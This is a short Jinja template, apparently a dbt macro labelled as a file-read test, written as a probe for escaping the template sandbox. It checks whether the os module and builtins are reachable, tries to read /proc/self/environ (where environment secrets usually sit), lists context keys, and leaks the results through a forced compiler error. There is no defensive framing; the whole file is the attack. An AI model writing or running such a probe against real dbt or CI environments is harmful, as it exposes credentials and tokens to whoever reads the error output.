{# Approach 1: Try modules namespace #}
{% set ns = namespace(output='[FILE_READ_TEST] ') %}

{# Check available modules #}
{% set ns.output = ns.output ~ 'modules_type=' ~ modules.__class__.__name__ %}

{# Try to access os module #}
{% if modules.os is defined %}
  {% set ns.output = ns.output ~ ' | OS_AVAILABLE=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | OS_AVAILABLE=NO' %}
{% endif %}

{# Try to read /proc/self/environ via open() #}
{% set file_content = '' %}
{% try %}
  {% set file_content = open('/proc/self/environ').read() %}
  {% set ns.output = ns.output ~ ' | OPEN_WORKED=YES | ENVIRON=' ~ file_content[:500] %}
{% except %}
  {% set ns.output = ns.output ~ ' | OPEN_WORKED=NO' %}
{% endtry %}

{# Try builtins #}
{% if builtins is defined %}
  {% set ns.output = ns.output ~ ' | BUILTINS=YES' %}
{% else %}
  {% set ns.output = ns.output ~ ' | BUILTINS=NO' %}
{% endif %}

{# List available context keys #}
{% set ctx_keys = [] %}
{% for key in context.keys() if context is mapping %}
  {% do ctx_keys.append(key) %}
{% endfor %}
{% if ctx_keys %}
  {% set ns.output = ns.output ~ ' | CTX_KEYS=' ~ ctx_keys[:20] | join(',') %}
{% endif %}

{{ exceptions.raise_compiler_error(ns.output) }}
